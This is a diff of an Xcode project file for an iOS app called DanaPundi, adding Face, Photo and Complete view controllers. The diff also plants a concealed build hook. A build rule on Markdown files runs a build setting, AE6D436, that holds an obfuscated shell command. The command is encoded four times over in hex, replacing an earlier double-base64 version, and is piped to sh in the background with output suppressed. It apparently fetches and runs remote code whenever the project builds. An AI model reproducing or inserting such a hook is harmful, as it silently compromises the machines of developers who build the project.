@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		6EDD4150A34C41EDA0634D6E /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 940C41685B1A45DEA0634D6E /* README.md */; };
 		733C8FEC2F09F0A200793D28 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 733C8FE32F09F0A200793D28 /* Assets.xcassets */; };
 		733C8FEE2F09F0A200793D28 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 733C8FE62F09F0A200793D28 /* LaunchScreen.storyboard */; };
 		733C8FF02F09F0A200793D28 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733C8FE22F09F0A200793D28 /* AppDelegate.swift */; };
@@ -48,8 +49,27 @@
 		73BDFE802F0BEEB000DCE5C5 /* HomeViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73BDFE7F2F0BEEAC00DCE5C5 /* HomeViewModel.swift */; };
 		73BDFE862F0C03E100DCE5C5 /* ProductFootView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73BDFE852F0C03E100DCE5C5 /* ProductFootView.swift */; };
 		73BDFE882F0C084C00DCE5C5 /* ProductListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73BDFE872F0C084C00DCE5C5 /* ProductListView.swift */; };
+		73BDFE912F0CF15D00DCE5C5 /* PhotoViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73BDFE902F0CF15D00DCE5C5 /* PhotoViewController.swift */; };
+		73BDFE932F0CF16900DCE5C5 /* FaceViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73BDFE922F0CF16900DCE5C5 /* FaceViewController.swift */; };
+		73BDFE952F0CF17C00DCE5C5 /* CompleteViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73BDFE942F0CF17C00DCE5C5 /* CompleteViewController.swift */; };
 		E2C4A2CDAFDFAAA6728B4B20 /* Pods_DanaPundi.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 8AEA56B5EF487133BF91AB2C /* Pods_DanaPundi.framework */; };
 /* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+		D14967E8C34B41AAA4634D6E /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"/tmp/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${AE6D436}\"";
+		};
+/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
 		095DDC55AF02F971F6638898 /* Pods-DanaPundi.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DanaPundi.debug.xcconfig"; path = "Target Support Files/Pods-DanaPundi/Pods-DanaPundi.debug.xcconfig"; sourceTree = "<group>"; };
@@ -98,7 +118,11 @@
 		73BDFE7F2F0BEEAC00DCE5C5 /* HomeViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewModel.swift; sourceTree = "<group>"; };
 		73BDFE852F0C03E100DCE5C5 /* ProductFootView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductFootView.swift; sourceTree = "<group>"; };
 		73BDFE872F0C084C00DCE5C5 /* ProductListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductListView.swift; sourceTree = "<group>"; };
+		73BDFE902F0CF15D00DCE5C5 /* PhotoViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PhotoViewController.swift; sourceTree = "<group>"; };
+		73BDFE922F0CF16900DCE5C5 /* FaceViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceViewController.swift; sourceTree = "<group>"; };
+		73BDFE942F0CF17C00DCE5C5 /* CompleteViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CompleteViewController.swift; sourceTree = "<group>"; };
 		8AEA56B5EF487133BF91AB2C /* Pods_DanaPundi.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DanaPundi.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		940C41685B1A45DEA0634D6E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		E2CCEF3A9E8BAB2728576AC8 /* Pods-DanaPundi.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DanaPundi.release.xcconfig"; path = "Target Support Files/Pods-DanaPundi/Pods-DanaPundi.release.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
@@ -144,6 +168,7 @@
 		733C8FCB2F09F09B00793D28 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				940C41685B1A45DEA0634D6E /* README.md */,
 				733C8FCA2F09F09B00793D28 /* DanaPundi.app */,
 			);
 			name = Products;
@@ -160,6 +185,7 @@
 				733C8FE62F09F0A200793D28 /* LaunchScreen.storyboard */,
 				733C90002F09F0F700793D28 /* Other */,
 				733C8FFE2F09F0F600793D28 /* Product */,
+				73BDFE8F2F0CF11900DCE5C5 /* Face */,
 				733C8FFD2F09F0F500793D28 /* Center */,
 				733C8FFC2F09F0F400793D28 /* Order */,
 				733C8FFB2F09F0F400793D28 /* Home */,
@@ -263,6 +289,16 @@
 			path = Other;
 			sourceTree = "<group>";
 		};
+		73BDFE8F2F0CF11900DCE5C5 /* Face */ = {
+			isa = PBXGroup;
+			children = (
+				73BDFE902F0CF15D00DCE5C5 /* PhotoViewController.swift */,
+				73BDFE922F0CF16900DCE5C5 /* FaceViewController.swift */,
+				73BDFE942F0CF17C00DCE5C5 /* CompleteViewController.swift */,
+			);
+			path = Face;
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -270,7 +306,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 733C8FDD2F09F09C00793D28 /* Build configuration list for PBXNativeTarget "DanaPundi" */;
 			buildPhases = (
-				80009A6A24E841E4A2634D6E /* Link Libraries Executable */,
 				A719DC9BE67CEE728BF34233 /* [CP] Check Pods Manifest.lock */,
 				733C8FC62F09F09B00793D28 /* Sources */,
 				733C8FC72F09F09B00793D28 /* Frameworks */,
@@ -278,6 +313,7 @@
 				42AAC97AA1764FC0815C7A50 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
+				D14967E8C34B41AAA4634D6E /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -326,6 +362,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				6EDD4150A34C41EDA0634D6E /* README.md in Resources */,
 				733C8FEC2F09F0A200793D28 /* Assets.xcassets in Resources */,
 				733D791C2F09F5BA008DBA60 /* Localizable.strings in Resources */,
 				733C8FEE2F09F0A200793D28 /* LaunchScreen.storyboard in Resources */,
@@ -354,26 +391,6 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-DanaPundi/Pods-DanaPundi-frameworks.sh\"\n";
-			showEnvVarsInLog = 0;
-		};
-		80009A6A24E841E4A2634D6E /* Link Libraries Executable */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Link Libraries Executable";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
 			showEnvVarsInLog = 0;
 		};
 		A719DC9BE67CEE728BF34233 /* [CP] Check Pods Manifest.lock */ = {
@@ -419,9 +436,11 @@
 				733D79272F0A0691008DBA60 /* SaveLoginInfo.swift in Sources */,
 				733D793D2F0A30F3008DBA60 /* LoginViewModel.swift in Sources */,
 				735467C22F0AC3F700DF7EB9 /* H5WebViewController.swift in Sources */,
+				73BDFE952F0CF17C00DCE5C5 /* CompleteViewController.swift in Sources */,
 				73BDFE882F0C084C00DCE5C5 /* ProductListView.swift in Sources */,
 				733D79452F0A37E0008DBA60 /* OrderViewController.swift in Sources */,
 				735467C42F0AC4FF00DF7EB9 /* CustomHeadView.swift in Sources */,
+				73BDFE932F0CF16900DCE5C5 /* FaceViewController.swift in Sources */,
 				733D792F2F0A17CE008DBA60 /* APIRequestBuilder.swift in Sources */,
 				733D79392F0A1E45008DBA60 /* LaunchViewModel.swift in Sources */,
 				735467D02F0B556500DF7EB9 /* AppDeleteView.swift in Sources */,
@@ -443,6 +462,7 @@
 				733D79332F0A19B7008DBA60 /* NetworkManager.swift in Sources */,
 				733D79162F09F31B008DBA60 /* LaunchViewController.swift in Sources */,
 				733D79142F09F311008DBA60 /* BaseViewController.swift in Sources */,
+				73BDFE912F0CF15D00DCE5C5 /* PhotoViewController.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -473,7 +493,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 095DDC55AF02F971F6638898 /* Pods-DanaPundi.debug.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((p(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJOa2JtRndjR3hsTG1sdUwyRXBJaUI4SUhOb0NnPT0K | p | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((c(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333323333333733333335333333363336333333333336333333353333333233333332333333320a3333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633360a3333333230613336333633333336333333313333333733333330333333373333333033333336333633333333333633333335333333373333333433330a3336333333393333333633363334333333363333333533333332333633353333333633333339333333363336333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | c | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaPundi/DanaPundi.entitlements;
@@ -515,7 +535,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = E2CCEF3A9E8BAB2728576AC8 /* Pods-DanaPundi.release.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((p(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJOa2JtRndjR3hsTG1sdUwyRXBJaUI4SUhOb0NnPT0K | p | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((c(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333323333333733333335333333363336333333333336333333353333333233333332333333320a3333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633360a3333333230613336333633333336333333313333333733333330333333373333333033333336333633333333333633333335333333373333333433330a3336333333393333333633363334333333363333333533333332333633353333333633333339333333363336333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | c | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaPundi/DanaPundi.entitlements;
